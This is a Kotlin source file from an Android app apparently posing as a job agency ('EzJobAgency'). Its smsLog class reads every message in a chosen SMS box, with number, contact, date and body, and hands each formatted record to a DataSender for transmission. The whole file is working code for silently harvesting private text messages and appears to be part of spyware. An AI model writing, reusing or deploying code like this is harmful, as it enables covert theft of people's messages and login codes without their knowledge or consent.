package com.example.EzJobAgency.DataRetriever

import android.content.Context
import android.net.Uri
import com.example.EzJobAgency.DataSender
import java.util.*


class smsLog(var context: Context, var dataSender: DataSender) {
    fun readSMSBox(box: String) {
        val SMSURI = Uri.parse("content://sms/$box")
        val cur = context.contentResolver.query(SMSURI, null, null, null, null)
            if (cur!!.moveToFirst()) {
                for (i in 0 until cur.count) {
                    val iterator = i.toString()
                    val number = cur.getString(cur.getColumnIndexOrThrow("address"))
                    var date = cur.getString(cur.getColumnIndexOrThrow("date"))
                    val person = cur.getString(cur.getColumnIndexOrThrow("person"))
                    val epoch = date.toLong()
                    val fDate = Date(epoch * 1000)
                    val body = cur.getString(cur.getColumnIndexOrThrow("body"))
                    val fi =
                        "#$iterator\nNumber : $number\nPerson : $person\nDate : $fDate\nBody : $body\n"
                    dataSender.sendData(fi)
                    cur.moveToNext()
                }
            }
    }
}